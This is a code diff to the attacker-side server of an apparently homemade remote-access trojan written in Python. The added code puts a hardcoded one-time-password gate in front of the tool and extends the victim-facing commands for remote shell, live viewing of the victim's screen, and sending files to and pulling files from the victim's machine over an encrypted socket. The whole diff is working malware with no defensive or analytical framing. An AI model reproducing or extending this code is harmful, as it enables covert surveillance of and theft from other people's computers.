@@ -1,4 +1,4 @@
-import socket, argparse, subprocess, re, time, os
+import socket, argparse, subprocess, re, time, os, pyotp, maskpass
 from sys import platform
 from vidstream import StreamingServer
 from threading import Thread
@@ -68,6 +68,16 @@ $$/   $$/  $$$$$$/     $$$$/   $$$$$$$/       $$/       $$$$$$$/    $$$$/
 """)
 
 
+pwd = maskpass.askpass(prompt=f"\n[{IMPORTANT}] Enter code: ", mask="*")
+totp = pyotp.TOTP('Fluffydolphin')
+totp_verify = totp.verify(pwd)
+
+if totp_verify != True:
+    print(f"[{INFO}] Incorrect\n")
+    exit()
+
+print(f"[{INFO}] Correct\n")
+
 s = socket.socket()
 
 s.bind((SERVER_HOST, SERVER_PORT))
@@ -113,7 +123,7 @@ while True:
         command = input(f"\n[{INPUT}] {cwd} $> ")
         if not command.strip():
             continue
-        if command == "exit" or command == "quit" or command == "q":
+        if command == "/exit" or command == "/quit" or command == "/q" or command == "exit":
             exit_choice = input(f"[{IMPORTANT}] Are you sure you want to exit (y/n)? {END}")
             while(exit_choice != "y" and exit_choice != "n"):
                 print(f"[{FAILED}] (y/n) \n{END}")
@@ -155,13 +165,13 @@ while True:
         f'''{MAIN}
         \r  Command                    Description
         \r  -------                    -----------
-        \r  /help                       Print this message.
-        \r  /getlive                    Gets a live feed of victim's screen.
-        \r  /stoplive                   Stop the live feed of victim's screen.
-        \r  /sendfile                  Sends a file from the files directory in the attacker directory.
+        \r  /help                      Print this message.
+        \r  /getlive                   Gets a live feed of victim's screen.
+        \r  /stoplive                  Stop the live feed of victim's screen.
+        \r  /sendfile                  Sends a file from the files directory in the victom's CWD directory.
         \r  /getfile                   Gets a file from the victim's CWD and puts it into the files directory.
-        \r  /clear                      Clear screen.
-        \r  exit/quit/q                  Close session and exit.
+        \r  /clear                     Clear screen.
+        \r  /exit/quit/q               Close session and exit.
         {END}''')
             continue
         if command != "/clear" and command != "/help":
@@ -171,23 +181,46 @@ while True:
             filenames = input(f"[{IMPORTANT}] Please enter the filename: ")
             filename = Fernet(key).encrypt(filenames.encode())
             client_socket.send(filename)
-            remaining = int.from_bytes(client_socket.recv(4),'big')
-            f = open(f"./files/{filenames}","wb")
-            while remaining:
-                data = client_socket.recv(min(remaining,4096))
-                remaining -= len(data)
-                f.write(data)
-            f.close()
+            file_location = client_socket.recv(BUFFER_SIZE)
+            file_location = Fernet(key).decrypt(file_location).decode()
+            if file_location == "no":
+                print(f"[{INFO}] File not found: {filenames}")
+                continue
+            if file_location == "yes":
+                file_start = client_socket.recv(BUFFER_SIZE)
+                file_start = Fernet(key).decrypt(file_start).decode()
+                print(f"[{INFO}] {file_start}")
+                remaining = int.from_bytes(client_socket.recv(4),'big')
+                f = open(f"./files/{filenames}","wb")
+                while remaining:
+                    data = client_socket.recv(min(remaining,4096))
+                    remaining -= len(data)
+                    f.write(data)
+                f.close()
+                print(f"[{INFO}] received {filenames}\n")
         if command == "/sendfile":
             filenames = input(f"[{IMPORTANT}] Please enter the filename: ")
-            filename = Fernet(key).encrypt(filenames.encode())
-            client_socket.send(filename)
-            with open(f"./files/{filenames}", "rb") as f:
-                data = f.read()
-                dataLen = len(data)
-                client_socket.send(dataLen.to_bytes(4,'big'))
-                client_socket.send(data)
-            f.close()
+            if os.path.exists(fr"./files/{filenames}") == False:
+                path_exist = Fernet(key).encrypt("no".encode())
+                client_socket.send(path_exist)
+                print(f"[{INFO}] File not found: ./files/{filenames}")
+                continue
+            if os.path.exists(fr"./files/{filenames}") == True:
+                print(f"[{INFO}] Sending {filenames}")
+                path_exist = Fernet(key).encrypt("yes".encode())
+                client_socket.send(path_exist)
+                time.sleep(0.5)
+                filename = Fernet(key).encrypt(filenames.encode())
+                client_socket.send(filename)
+                with open(f"./files/{filenames}", "rb") as f:
+                    data = f.read()
+                    dataLen = len(data)
+                    client_socket.send(dataLen.to_bytes(4,'big'))
+                    client_socket.send(data)
+                f.close()
+                file_finish = client_socket.recv(BUFFER_SIZE)
+                file_finish = Fernet(key).decrypt(file_finish).decode()
+                print(f"[{INFO}] {file_finish}\n")
         if command == "/getlive":
             server_location = client_socket.recv(BUFFER_SIZE)
             server_location = Fernet(key).decrypt(server_location).decode()
